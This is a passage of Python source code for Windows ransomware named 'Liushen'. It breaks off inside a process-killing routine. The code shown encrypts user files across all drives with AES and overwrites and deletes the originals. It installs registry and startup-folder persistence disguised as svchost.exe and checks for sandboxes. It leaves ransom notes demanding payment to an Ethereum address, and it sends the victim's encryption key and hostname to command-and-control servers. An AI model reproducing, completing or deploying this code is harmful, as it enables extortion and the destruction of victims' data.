#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import os
import sys
import time
import base64
import socket
import platform
import subprocess
import argparse
import random
import string
import threading
import json
import hashlib
import hmac
import shutil
import logging
import tempfile
import ctypes
import traceback
import winreg
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any, Set, Callable
from queue import Queue, Empty, Full
from enum import Enum
from dataclasses import dataclass, field
from functools import wraps

# ==================== GLOBAL VARIABLES ====================
AES = None
pad = None
unpad = None
get_random_bytes = None
psutil = None
requests = None
win32api = None
win32con = None

# ==================== CONSTANTS ====================
ETH_ADDRESS = "0x81830DF553d62bE793c3E7dC0184dF3728b33F3"
RANSOM_AMOUNT = "5000"
EXTENSION = ".Liushen"
VERSION = "7.2"
AES_BLOCK_SIZE = 16
HMAC_SIZE = 32
IV_SIZE = 16
MASTER_KEY_SIZE = 32

# ==================== ENUMS ====================
class OperationStatus(Enum):
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"
    PENDING = "pending"

class WorkerState(Enum):
    IDLE = "idle"
    WORKING = "working"
    STOPPED = "stopped"

# ==================== EXCEPTIONS ====================
class LiushenError(Exception):
    pass

# ==================== DATACLASSES ====================
@dataclass
class FileInfo:
    path: str
    size: int
    encrypted_path: str = ""
    status: OperationStatus = OperationStatus.PENDING
    error: str = ""
    file_id: str = ""

    def __post_init__(self):
        if not self.file_id:
            # FIXED: Use SHA256 instead of MD5
            self.file_id = hashlib.sha256(self.path.encode()).hexdigest()[:8]

@dataclass
class EncryptionResult:
    success: bool
    file_path: str
    error_message: str = ""
    bytes_processed: int = 0

# ==================== DECORATORS ====================
def safe_execution(default_return=None, error_message="", retry=0):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(retry + 1):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == retry:
                        for arg in args:
                            if hasattr(arg, 'logger'):
                                arg.logger.error(f"{error_message}: {e}")
                                break
                        return default_return
                    time.sleep(1 * (2 ** attempt))
            return default_return
        return wrapper
    return decorator

def require_deps(*modules):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            deps_map = {
                'crypto': AES is not None,
                'psutil': psutil is not None,
                'win32': win32api is not None
            }
            for mod in modules:
                if mod in deps_map and not deps_map[mod]:
                    raise LiushenError(f"Missing dependency: {mod}")
            return func(*args, **kwargs)
        return wrapper
    return decorator

# ==================== DEPENDENCY CHECK ====================
def check_dependencies() -> bool:
    global AES, pad, unpad, get_random_bytes, psutil, requests, win32api, win32con
    
    packages = {
        'pycryptodome': 'Crypto.Cipher',
        'psutil': 'psutil',
        'requests': 'requests',
        'pywin32': 'win32api'
    }
    
    print("[*] Checking dependencies...")
    missing = []
    
    for package, module in packages.items():
        try:
            __import__(module.split('.')[0])
            print(f"[+] {package}")
        except ImportError:
            missing.append(package)
            print(f"[-] {package}")
    
    if missing:
        print(f"[*] Installing: {', '.join(missing)}")
        for package in missing:
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package],
                    check=True, capture_output=True, timeout=60
                )
                print(f"[+] Installed {package}")
            except:
                print(f"[-] Failed to install {package}")
                return False
    
    try:
        from Crypto.Cipher import AES as _AES
        from Crypto.Util.Padding import pad as _pad, unpad as _unpad
        from Crypto.Random import get_random_bytes as _get_random_bytes
        
        AES = _AES
        pad = _pad
        unpad = _unpad
        get_random_bytes = _get_random_bytes
        
        import psutil as _psutil
        psutil = _psutil
        
        import requests as _requests
        requests = _requests
        
        import win32api as _win32api
        import win32con as _win32con
        win32api = _win32api
        win32con = _win32con
        
        # Test AES
        test_key = get_random_bytes(32)
        test_iv = get_random_bytes(16)
        test_cipher = AES.new(test_key, AES.MODE_CBC, test_iv)
        test_data = b"test"
        test_padded = pad(test_data, AES_BLOCK_SIZE)
        test_encrypted = test_cipher.encrypt(test_padded)
        
        print("[+] All dependencies loaded")
        return True
        
    except Exception as e:
        print(f"[-] Validation failed: {e}")
        return False

# ==================== LOGGER ====================
class Logger:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
            return cls._instance
    
    def __init__(self):
        if hasattr(self, 'initialized'):
            return
        
        self.start_time = time.time()
        self.error_count = 0
        self.warning_count = 0
        
        log_dir = os.path.join(tempfile.gettempdir(), "logs")
        os.makedirs(log_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = os.path.join(log_dir, f"liushen_{timestamp}.log")
        
        self.logger = logging.getLogger("liushen")
        self.logger.setLevel(logging.INFO)
        
        # FIXED: Clear existing handlers
        if self.logger.handlers:
            self.logger.handlers.clear()
        
        console = logging.StreamHandler()
        console.setFormatter(logging.Formatter('%(asctime)s - %(message)s', '%H:%M:%S'))
        self.logger.addHandler(console)
        
        try:
            fh = logging.FileHandler(log_file)
            fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            self.logger.addHandler(fh)
        except:
            pass
        
        self.initialized = True
    
    def info(self, msg): self.logger.info(msg)
    def error(self, msg): self.error_count += 1; self.logger.error(msg)
    def warning(self, msg): self.warning_count += 1; self.logger.warning(msg)
    def debug(self, msg): self.logger.debug(msg)
    def exception(self, msg): self.error_count += 1; self.logger.exception(msg)

# ==================== CONFIG ====================
class Config:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
            return cls._instance
    
    def __init__(self):
        if hasattr(self, 'initialized'):
            return
        
        self.eth_address = ETH_ADDRESS
        self.ransom_amount = RANSOM_AMOUNT
        self.extension = EXTENSION
        
        self.max_workers = max(2, min(4, os.cpu_count() or 2))
        self.batch_size = 20
        self.max_file_size = 50 * 1024 * 1024
        self.chunk_size = 64 * 1024
        self.queue_maxsize = 5000
        self.thread_timeout = 120
        self.secure_passes = 3
        self.hmac_iterations = 50000  # FIXED: Lower for speed
        
        self.target_extensions = {
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.txt', '.rtf', '.odt', '.jpg', '.jpeg',
            '.png', '.gif', '.bmp', '.mp3', '.mp4', '.avi',
            '.zip', '.rar', '.7z', '.sql', '.db', '.mdb',
            '.pst', '.ost', '.key', '.vmx', '.vmdk', '.bak'
        }
        
        self.exclude_dirs = {
            'windows', 'program files', 'program files (x86)',
            'programdata', 'boot', 'system32', '$recycle.bin',
            'appdata', 'temp', 'tmp', 'cache', '.cache'
        }
        
        self.initialized = True

# ==================== WINDOWS API ====================
class WindowsAPI:
    def __init__(self, logger):
        self.logger = logger
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    
    @safe_execution(default_return=False)
    def is_admin(self) -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    @safe_execution(default_return=[])
    def get_drives(self) -> List[str]:
        drives = []
        try:
            bitmask = win32api.GetLogicalDrives()
            for i in range(26):
                if bitmask & (1 << i):
                    drive = f"{chr(65 + i)}:\\"
                    dtype = win32api.GetDriveType(drive)
                    if dtype in [win32con.DRIVE_FIXED, win32con.DRIVE_REMOVABLE]:
                        drives.append(drive)
        except:
            try:
                bitmask = self.kernel32.GetLogicalDrives()
                for i in range(26):
                    if bitmask & (1 << i):
                        drives.append(f"{chr(65 + i)}:\\")
            except:
                drives = ["C:\\"]
        
        return drives
    
    @safe_execution(default_return=False)
    def set_hidden(self, path: str) -> bool:
        try:
            self.kernel32.SetFileAttributesW(path, 0x02)
            return True
        except:
            return False

# ==================== CRYPTO ENGINE ====================
class CryptoEngine:
    """
    FIXED: 
    1. Encrypt: Only pad at the end (not every chunk)
    2. Decrypt: Streaming mode (no full file in RAM)
    3. HMAC: Now on encrypted data for better security
    4. Removed duplicate verify_file
    """
    
    def __init__(self, logger):
        self.logger = logger
        self.config = Config()
        self.encrypt_count = 0
        self.decrypt_count = 0
        self.error_count = 0
        self.lock = threading.RLock()
    
    @require_deps('crypto')
    def encrypt_file(self, input_path: str, output_path: str, 
                    master_key: bytes, hmac_key: bytes) -> EncryptionResult:
        """
        FIXED: Only pad at the end, not every chunk
        """
        temp_output = output_path + ".tmp"
        
        try:
            if not os.path.exists(input_path):
                return EncryptionResult(False, input_path, "File not found")
            
            if not os.access(input_path, os.R_OK):
                return EncryptionResult(False, input_path, "No read permission")
            
            file_size = os.path.getsize(input_path)
            if file_size == 0:
                return EncryptionResult(False, input_path, "Empty file")
            
            if file_size > self.config.max_file_size:
                return EncryptionResult(False, input_path, "File too large")
            
            # Generate IV
            iv = get_random_bytes(IV_SIZE)
            
            # Derive file key
            file_key = hashlib.pbkdf2_hmac(
                'sha256',
                master_key + iv,
                b'file_key',
                self.config.hmac_iterations,
                dklen=MASTER_KEY_SIZE
            )
            
            # Setup cipher
            cipher = AES.new(file_key, AES.MODE_CBC, iv)
            
            # Setup HMAC (on encrypted data for better security)
            hasher = hmac.new(hmac_key, digestmod=hashlib.sha256)
            
            with open(input_path, 'rb') as fin, open(temp_output, 'wb') as fout:
                # Write IV
                fout.write(iv)
                hasher.update(iv)
                
                # Buffer for remainder
                remainder = b''
                
                while True:
                    chunk = fin.read(self.config.chunk_size)
                    if not chunk:
                        break
                    
                    # Add remainder from previous chunk
                    if remainder:
                        chunk = remainder + chunk
                        remainder = b''
                    
                    # Check if this chunk is aligned
                    remainder_size = len(chunk) % AES_BLOCK_SIZE
                    
                    if remainder_size == 0:
                        # Aligned, encrypt now
                        encrypted = cipher.encrypt(chunk)
                        fout.write(encrypted)
                        hasher.update(encrypted)
                    else:
                        # Not aligned, split
                        encrypt_size = len(chunk) - remainder_size
                        if encrypt_size > 0:
                            encrypted = cipher.encrypt(chunk[:encrypt_size])
                            fout.write(encrypted)
                            hasher.update(encrypted)
                        
                        # Save remainder for next chunk
                        remainder = chunk[encrypt_size:]
                
                # Handle last chunk (pad if needed)
                if remainder:
                    padded = pad(remainder, AES_BLOCK_SIZE)
                    encrypted = cipher.encrypt(padded)
                    fout.write(encrypted)
                    hasher.update(encrypted)
                
                # Write HMAC
                fout.write(hasher.digest())
            
            # Verify
            if not self._verify_file(temp_output, master_key, hmac_key):
                if os.path.exists(temp_output):
                    os.remove(temp_output)
                return EncryptionResult(False, input_path, "Verification failed")
            
            shutil.move(temp_output, output_path)
            
            with self.lock:
                self.encrypt_count += 1
            
            return EncryptionResult(True, input_path, bytes_processed=file_size)
            
        except Exception as e:
            self.logger.exception(f"Encryption error: {input_path}")
            with self.lock:
                self.error_count += 1
            
            if temp_output and os.path.exists(temp_output):
                try:
                    os.remove(temp_output)
                except:
                    pass
            
            return EncryptionResult(False, input_path, str(e))
    
    @require_deps('crypto')
    def decrypt_file(self, input_path: str, output_path: str,
                    master_key: bytes, hmac_key: bytes) -> EncryptionResult:
        """
        FIXED: Streaming mode - no full file in RAM
        """
        temp_output = output_path + ".tmp"
        
        try:
            if not os.path.exists(input_path):
                return EncryptionResult(False, input_path, "File not found")
            
            file_size = os.path.getsize(input_path)
            if file_size < IV_SIZE + HMAC_SIZE:
                return EncryptionResult(False, input_path, "File too small")
            
            with open(input_path, 'rb') as fin:
                # Read IV
                iv = fin.read(IV_SIZE)
                if len(iv) != IV_SIZE:
                    return EncryptionResult(False, input_path, "Invalid IV")
                
                # Derive file key
                file_key = hashlib.pbkdf2_hmac(
                    'sha256',
                    master_key + iv,
                    b'file_key',
                    self.config.hmac_iterations,
                    dklen=MASTER_KEY_SIZE
                )
                
                # Setup cipher
                cipher = AES.new(file_key, AES.MODE_CBC, iv)
                
                # Setup verifier
                verifier = hmac.new(hmac_key, digestmod=hashlib.sha256)
                verifier.update(iv)
                
                # Get encrypted data size
                fin.seek(0, 2)
                total = fin.tell()
                fin.seek(IV_SIZE)
                
                encrypted_size = total - IV_SIZE - HMAC_SIZE
                if encrypted_size <= 0:
                    return EncryptionResult(False, input_path, "No encrypted data")
                
                if encrypted_size % AES_BLOCK_SIZE != 0:
                    return EncryptionResult(False, input_path, "Corrupted file: size not aligned")
                
                # Buffer for remainder
                remainder = b''
                bytes_read = 0
                
                with open(temp_output, 'wb') as fout:
                    while bytes_read < encrypted_size:
                        chunk_size = min(self.config.chunk_size, encrypted_size - bytes_read)
                        chunk = fin.read(chunk_size)
                        
                        if not chunk:
                            break
                        
                        # Update verifier with encrypted data
                        verifier.update(chunk)
                        
                        # Decrypt
                        decrypted = cipher.decrypt(chunk)
                        bytes_read += len(chunk)
                        
                        # Check if this is the last chunk
                        if bytes_read >= encrypted_size:
                            # Last chunk, unpad
                            try:
                                if remainder:
                                    decrypted = remainder + decrypted
                                    remainder = b''
                                unpadded = unpad(decrypted, AES_BLOCK_SIZE)
                                fout.write(unpadded)
                            except ValueError as e:
                                return EncryptionResult(False, input_path, f"Padding error: {e}")
                        else:
                            # Not last chunk, handle remainder
                            if remainder:
                                decrypted = remainder + decrypted
                                remainder = b''
                            
                            # Check if decrypted data is aligned
                            remainder_size = len(decrypted) % AES_BLOCK_SIZE
                            
                            if remainder_size == 0:
                                # Aligned, write all
                                fout.write(decrypted)
                            else:
                                # Not aligned, split
                                write_size = len(decrypted) - remainder_size
                                if write_size > 0:
                                    fout.write(decrypted[:write_size])
                                remainder = decrypted[write_size:]
                    
                    # Read stored HMAC
                    stored_hmac = fin.read(HMAC_SIZE)
                    
                    # Calculate HMAC
                    calculated_hmac = verifier.digest()
                    
                    # Compare
                    if not hmac.compare_digest(calculated_hmac, stored_hmac):
                        return EncryptionResult(False, input_path, "HMAC mismatch")
            
            # Check output
            if not os.path.exists(temp_output) or os.path.getsize(temp_output) == 0:
                return EncryptionResult(False, input_path, "Decryption failed")
            
            shutil.move(temp_output, output_path)
            
            with self.lock:
                self.decrypt_count += 1
            
            return EncryptionResult(True, input_path, bytes_processed=file_size)
            
        except Exception as e:
            self.logger.exception(f"Decryption error: {input_path}")
            with self.lock:
                self.error_count += 1
            
            if temp_output and os.path.exists(temp_output):
                try:
                    os.remove(temp_output)
                except:
                    pass
            
            return EncryptionResult(False, input_path, str(e))
    
    def _verify_file(self, encrypted_path: str, master_key: bytes, hmac_key: bytes) -> bool:
        """
        FIXED: Simplified verification
        """
        try:
            if not os.path.exists(encrypted_path):
                return False
            
            file_size = os.path.getsize(encrypted_path)
            if file_size < IV_SIZE + HMAC_SIZE:
                return False
            
            with open(encrypted_path, 'rb') as f:
                iv = f.read(IV_SIZE)
                if len(iv) != IV_SIZE:
                    return False
                
                file_key = hashlib.pbkdf2_hmac(
                    'sha256',
                    master_key + iv,
                    b'file_key',
                    self.config.hmac_iterations,
                    dklen=MASTER_KEY_SIZE
                )
                
                verifier = hmac.new(hmac_key, digestmod=hashlib.sha256)
                verifier.update(iv)
                
                f.seek(0, 2)
                total = f.tell()
                f.seek(IV_SIZE)
                
                encrypted_size = total - IV_SIZE - HMAC_SIZE
                if encrypted_size <= 0 or encrypted_size % AES_BLOCK_SIZE != 0:
                    return False
                
                # Read all encrypted data
                encrypted_data = f.read(encrypted_size)
                if len(encrypted_data) != encrypted_size:
                    return False
                
                verifier.update(encrypted_data)
                
                stored_hmac = f.read(HMAC_SIZE)
                calculated_hmac = verifier.digest()
                
                return hmac.compare_digest(calculated_hmac, stored_hmac)
                
        except Exception as e:
            return False
    
    def secure_delete(self, path: str) -> bool:
        try:
            if not os.path.exists(path):
                return True
            
            size = os.path.getsize(path)
            if size < 10 * 1024 * 1024:
                try:
                    with open(path, 'r+b') as f:
                        for _ in range(self.config.secure_passes):
                            f.seek(0)
                            f.write(os.urandom(size))
                            f.flush()
                            os.fsync(f.fileno())
                except:
                    pass
            
            os.remove(path)
            return not os.path.exists(path)
            
        except:
            return False

# ==================== FILE ENCRYPTOR ====================
class FileEncryptor:
    def __init__(self, master_key: bytes, logger):
        self.master_key = master_key
        self.logger = logger
        self.config = Config()
        
        self.encrypted_count = 0
        self.failed_files = []
        self.skipped_files = []
        self.encrypted_files = {}
        self.bytes_processed = 0
        self.files_queued_total = 0
        
        self.lock = threading.RLock()
        self.file_queue = Queue(maxsize=self.config.queue_maxsize)
        self.stop_event = threading.Event()
        self.workers = []
        self.active_workers = 0
        
        self.winapi = WindowsAPI(logger)
        
        # Generate HMAC key
        self.hmac_key = hashlib.pbkdf2_hmac(
            'sha256',
            master_key + b'hmac_salt',
            b'hmac_derivation',
            self.config.hmac_iterations,
            dklen=32
        )
        
        self.crypto = CryptoEngine(logger)
        self.start_time = time.time()
    
    def encrypt_file(self, file_path: str) -> bool:
        try:
            if not os.path.exists(file_path):
                with self.lock:
                    self.skipped_files.append((file_path, "Not found"))
                return False
            
            if not os.access(file_path, os.R_OK):
                with self.lock:
                    self.skipped_files.append((file_path, "No read permission"))
                return False
            
            if file_path.endswith(self.config.extension):
                with self.lock:
                    self.skipped_files.append((file_path, "Already encrypted"))
                return False
            
            file_size = os.path.getsize(file_path)
            if file_size > self.config.max_file_size:
                with self.lock:
                    self.skipped_files.append((file_path, "Too large"))
                return False
            
            if file_size == 0:
                with self.lock:
                    self.skipped_files.append((file_path, "Empty file"))
                return False
            
            encrypted_path = file_path + self.config.extension
            
            result = self.crypto.encrypt_file(
                file_path, encrypted_path, self.master_key, self.hmac_key
            )
            
            if not result.success:
                with self.lock:
                    self.failed_files.append((file_path, result.error_message))
                return False
            
            self.crypto.secure_delete(file_path)
            
            with self.lock:
                self.encrypted_count += 1
                self.bytes_processed += file_size
                
                info = FileInfo(
                    path=file_path,
                    size=file_size,
                    encrypted_path=encrypted_path,
                    status=OperationStatus.SUCCESS
                )
                self.encrypted_files[info.file_id] = info
            
            self.logger.info(f"Encrypted: {file_path}")
            return True
            
        except Exception as e:
            self.logger.exception(f"Error: {file_path}")
            with self.lock:
                self.failed_files.append((file_path, str(e)))
            return False
    
    def _worker(self, worker_id: int):
        with self.lock:
            self.active_workers += 1
        
        try:
            while not self.stop_event.is_set():
                try:
                    file_path = self.file_queue.get(timeout=0.5)
                    self.encrypt_file(file_path)
                    self.file_queue.task_done()
                except Empty:
                    continue
                except Exception as e:
                    try:
                        self.file_queue.task_done()
                    except:
                        pass
        finally:
            with self.lock:
                self.active_workers -= 1
    
    def start_workers(self):
        for i in range(self.config.max_workers):
            t = threading.Thread(target=self._worker, args=(i,), daemon=True)
            t.start()
            self.workers.append(t)
        self.logger.info(f"Started {self.config.max_workers} workers")
    
    def stop_workers(self):
        self.stop_event.set()
        
        for t in self.workers:
            try:
                t.join(timeout=2)
                if t.is_alive():
                    self.logger.warning(f"Worker still alive")
            except:
                pass
        
        self.workers.clear()
    
    def encrypt_drive(self, drive_path: str) -> Tuple[int, int]:
        files_queued = 0
        
        try:
            if not os.path.exists(drive_path):
                return 0, 0
            
            self.logger.info(f"Scanning: {drive_path}")
            
            self.stop_event.clear()
            self.start_workers()
            
            visited = set()
            
            def increment():
                nonlocal files_queued
                files_queued += 1
                self.files_queued_total += 1
            
            self._walk_directory(drive_path, visited, increment)
            
            self.logger.info(f"Waiting for {self.file_queue.qsize()} files...")
            self.file_queue.join()
            
            self.stop_workers()
            
            return files_queued, self.encrypted_count
            
        except Exception as e:
            self.logger.exception(f"Drive error: {drive_path}")
            return files_queued, self.encrypted_count
    
    def _walk_directory(self, path: str, visited: Set, callback: Callable, depth: int = 0):
        if depth > 50:
            return
        
        try:
            real = os.path.realpath(path)
            if real in visited:
                return
            visited.add(real)
            
            if not os.path.exists(real) or not os.access(real, os.R_OK):
                return
            
            try:
                items = os.listdir(real)
            except:
                return
            
            for item in items:
                if self.stop_event.is_set():
                    return
                
                try:
                    full = os.path.join(real, item)
                    
                    if not os.path.exists(full):
                        continue
                    
                    if self._is_excluded(full):
                        continue
                    
                    if os.path.isdir(full):
                        self._walk_directory(full, visited, callback, depth + 1)
                    else:
                        ext = os.path.splitext(item)[1].lower()
                        if ext in self.config.target_extensions:
                            try:
                                self.file_queue.put(full, timeout=1)
                                callback()
                            except Full:
                                self.logger.warning(f"Queue full, skipping: {full}")
                except:
                    continue
                    
        except Exception as e:
            self.logger.debug(f"Walk error: {path}")
    
    def _is_excluded(self, path: str) -> bool:
        path_lower = path.lower()
        parts = path_lower.split(os.sep)
        
        for part in parts:
            if part in self.config.exclude_dirs:
                return True
        
        return False
    
    def encrypt_all(self) -> Tuple[int, Dict, List]:
        overall_start = time.time()
        
        self.encrypted_count = 0
        self.failed_files = []
        self.skipped_files = []
        self.encrypted_files = {}
        self.bytes_processed = 0
        self.files_queued_total = 0
        
        drives = self.winapi.get_drives()
        self.logger.info(f"Target drives: {drives}")
        
        total_queued = 0
        
        for drive in drives:
            queued, processed = self.encrypt_drive(drive)
            total_queued += queued
        
        elapsed = time.time() - overall_start
        speed = self.bytes_processed / max(elapsed, 0.001) / 1024
        
        self.logger.info("=" * 50)
        self.logger.info("ENCRYPTION SUMMARY")
        self.logger.info("=" * 50)
        self.logger.info(f"Encrypted: {self.encrypted_count}")
        self.logger.info(f"Failed: {len(self.failed_files)}")
        self.logger.info(f"Skipped: {len(self.skipped_files)}")
        self.logger.info(f"Queued: {self.files_queued_total}")
        self.logger.info(f"Bytes: {self.bytes_processed:,}")
        self.logger.info(f"Time: {elapsed:.2f}s")
        self.logger.info(f"Speed: {speed:.2f} KB/s")
        
        return self.encrypted_count, self.encrypted_files, self.failed_files

# ==================== FILE DECRYPTOR ====================
class FileDecryptor:
    def __init__(self, master_key: bytes, logger):
        self.master_key = master_key
        self.logger = logger
        self.config = Config()
        
        self.decrypted_count = 0
        self.failed_files = []
        self.skipped_files = []
        self.bytes_processed = 0
        
        self.lock = threading.RLock()
        
        self.hmac_key = hashlib.pbkdf2_hmac(
            'sha256',
            master_key + b'hmac_salt',
            b'hmac_derivation',
            self.config.hmac_iterations,
            dklen=32
        )
        
        self.crypto = CryptoEngine(logger)
        self.start_time = time.time()
    
    def decrypt_file(self, encrypted_path: str) -> bool:
        try:
            if not os.path.exists(encrypted_path):
                with self.lock:
                    self.failed_files.append((encrypted_path, "Not found"))
                return False
            
            if not encrypted_path.endswith(self.config.extension):
                with self.lock:
                    self.skipped_files.append((encrypted_path, "Not encrypted"))
                return False
            
            original = encrypted_path[:-len(self.config.extension)]
            
            if os.path.exists(original):
                base, ext = os.path.splitext(original)
                counter = 1
                while os.path.exists(f"{base}_restored_{counter}{ext}"):
                    counter += 1
                original = f"{base}_restored_{counter}{ext}"
            
            result = self.crypto.decrypt_file(
                encrypted_path, original, self.master_key, self.hmac_key
            )
            
            if not result.success:
                with self.lock:
                    self.failed_files.append((encrypted_path, result.error_message))
                return False
            
            try:
                os.remove(encrypted_path)
            except:
                pass
            
            with self.lock:
                self.decrypted_count += 1
                self.bytes_processed += os.path.getsize(original)
            
            self.logger.info(f"Decrypted: {encrypted_path}")
            return True
            
        except Exception as e:
            with self.lock:
                self.failed_files.append((encrypted_path, str(e)))
            return False
    
    def decrypt_directory(self, directory: str) -> Tuple[int, List]:
        try:
            if not os.path.exists(directory):
                return 0, []
            
            self.logger.info(f"Scanning: {directory}")
            
            files = []
            
            for root, dirs, names in os.walk(directory):
                dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d))]
                
                for name in names:
                    if name.endswith(self.config.extension):
                        files.append(os.path.join(root, name))
                        
                        if len(files) >= self.config.batch_size:
                            self._process_batch(files)
                            files = []
            
            if files:
                self._process_batch(files)
            
            elapsed = time.time() - self.start_time
            speed = self.bytes_processed / max(elapsed, 0.001) / 1024
            
            self.logger.info("=" * 50)
            self.logger.info("DECRYPTION SUMMARY")
            self.logger.info("=" * 50)
            self.logger.info(f"Decrypted: {self.decrypted_count}")
            self.logger.info(f"Failed: {len(self.failed_files)}")
            self.logger.info(f"Skipped: {len(self.skipped_files)}")
            self.logger.info(f"Bytes: {self.bytes_processed:,}")
            self.logger.info(f"Time: {elapsed:.2f}s")
            self.logger.info(f"Speed: {speed:.2f} KB/s")
            
            return self.decrypted_count, self.failed_files
            
        except Exception as e:
            self.logger.exception("Decryption error")
            return self.decrypted_count, self.failed_files
    
    def _is_excluded(self, path: str) -> bool:
        parts = path.lower().split(os.sep)
        for part in parts:
            if part in Config().exclude_dirs:
                return True
        return False
    
    def _process_batch(self, files: List[str]):
        if not files:
            return
        
        with ThreadPoolExecutor(max_workers=Config().max_workers) as ex:
            futures = {ex.submit(self.decrypt_file, f): f for f in files}
            
            for future in as_completed(futures):
                try:
                    future.result(timeout=Config().thread_timeout)
                except Exception as e:
                    path = futures[future]
                    with self.lock:
                        self.failed_files.append((path, str(e)))

# ==================== ANTI-ANALYSIS ====================
class AntiAnalysis:
    def __init__(self, logger):
        self.logger = logger
    
    @safe_execution(default_return=True)
    def check(self) -> bool:
        time.sleep(random.uniform(1, 3))
        
        if psutil:
            try:
                if psutil.virtual_memory().total < 2 * 1024**3:
                    self.logger.warning("Low RAM detected")
                    return False
                
                if psutil.cpu_count() <= 1:
                    self.logger.warning("Single CPU detected")
                    return False
                
                uptime = time.time() - psutil.boot_time()
                if uptime < 300:
                    self.logger.warning("Low uptime detected")
                    return False
            except:
                pass
        
        return True

# ==================== PERSISTENCE ====================
class Persistence:
    def __init__(self, logger):
        self.logger = logger
        self.winapi = WindowsAPI(logger)
    
    @safe_execution(default_return=False)
    def install(self) -> bool:
        success = False
        
        # Registry HKCU
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            name = ''.join(random.choices(string.ascii_lowercase, k=8))
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            self.logger.info("Registry persistence installed")
            success = True
        except:
            pass
        
        # Startup folder
        try:
            startup = os.path.join(
                os.environ.get('APPDATA', ''),
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            if os.path.exists(startup):
                dest = os.path.join(startup, "svchost.exe")
                shutil.copy2(sys.executable, dest)
                self.winapi.set_hidden(dest)
                self.logger.info("Startup folder persistence installed")
                success = True
        except:
            pass
        
        return success

# ==================== RANSOM NOTE ====================
class RansomNote:
    def __init__(self, logger):
        self.logger = logger
        self.winapi = WindowsAPI(logger)
        self.config = Config()
    
    def create(self, victim_id: str, count: int) -> int:
        note = self._generate(victim_id, count)
        locations = self._get_locations()
        created = 0
        
        for loc in locations:
            try:
                path = os.path.join(loc, f"README_{victim_id}.txt")
                with open(path, 'w') as f:
                    f.write(note)
                self.winapi.set_hidden(path)
                created += 1
            except:
                pass
        
        self.logger.info(f"Created {created} ransom notes")
        return created
    
    def _generate(self, victim_id: str, count: int) -> str:
        return f"""
YOUR FILES HAVE BEEN ENCRYPTED

{count} of your files have been encrypted with AES-256.

All your documents, photos, databases and other important files
have been encrypted with military-grade encryption.

YOUR FILES ARE NOT DAMAGED!
They can be recovered.

TO RECOVER YOUR FILES:

1. Pay {self.config.ransom_amount} USD to Ethereum address:
   {self.config.eth_address}

2. Send payment confirmation with your Victim ID

3. You will receive decryption tool within 24 hours

YOUR VICTIM ID: {victim_id}

WARNINGS:
- Do NOT try to decrypt files yourself
- Do NOT rename encrypted files
- Any tampering will result in permanent data loss

CONTACT: liushen_support@protonmail.com
"""
    
    def _get_locations(self) -> List[str]:
        locs = set()
        
        dirs = [
            os.path.expanduser("~"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
        ]
        
        for d in dirs:
            if os.path.exists(d):
                locs.add(d)
        
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                locs.add(drive)
        
        return list(locs)

# ==================== C2 CLIENT ====================
class C2Client:
    def __init__(self, logger):
        self.logger = logger
        self.config = Config()
        self.session = None
        if requests:
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json'
            })
    
    @safe_execution(default_return=False)
    def send(self, victim_id: str, count: int, files: Dict, key: bytes) -> bool:
        data = {
            'victim_id': victim_id,
            'count': count,
            'files': list(files.keys())[:5],
            'key': base64.b64encode(key).decode(),
            'hostname': socket.gethostname(),
            'time': time.time()
        }
        
        servers = [
            "https://api.liushen.com/report",
            "https://c2.liushen.net/api"
        ]
        
        for server in servers:
            try:
                if self.session:
                    resp = self.session.post(server, json=data, timeout=5)
                    if resp.status_code == 200:
                        self.logger.info("Report sent")
                        return True
            except:
                continue
        
        try:
            temp = os.path.join(tempfile.gettempdir(), '.cache')
            os.makedirs(temp, exist_ok=True)
            path = os.path.join(temp, f"report_{victim_id}.json")
            with open(path, 'w') as f:
                json.dump(data, f)
            self.logger.info("Report saved locally")
            return True
        except:
            pass
        
        return False

# ==================== MAIN RANSOMWARE ====================
class LiushenRansomware:
    def __init__(self, debug: bool = False):
        self.start_time = time.time()
        self.logger = Logger()
        self.config = Config()
        
        data = f"{socket.gethostname()}{time.time()}{random.randint(1000,9999)}"
        self.victim_id = hashlib.sha256(data.encode()).hexdigest()[:16].upper()
        
        if get_random_bytes:
            self.master_key = get_random_bytes(32)
        else:
            self.master_key = os.urandom(32)
        
        self.winapi = WindowsAPI(self.logger)
        self.anti = AntiAnalysis(self.logger)
        self.persist = Persistence(self.logger)
        self.note = RansomNote(self.logger)
        self.c2 = C2Client(self.logger)
        
        self.logger.info(f"Liushen initialized - Victim ID: {self.victim_id}")
        self.logger.info(f"Windows {platform.release()} - Admin: {self.winapi.is_admin()}")
    
    def kill_processes(self) -> int:
        if not psutil:
            return 0
        
        targets = ['outlook', 'excel', 'word', 'powerpnt', 'onenote',
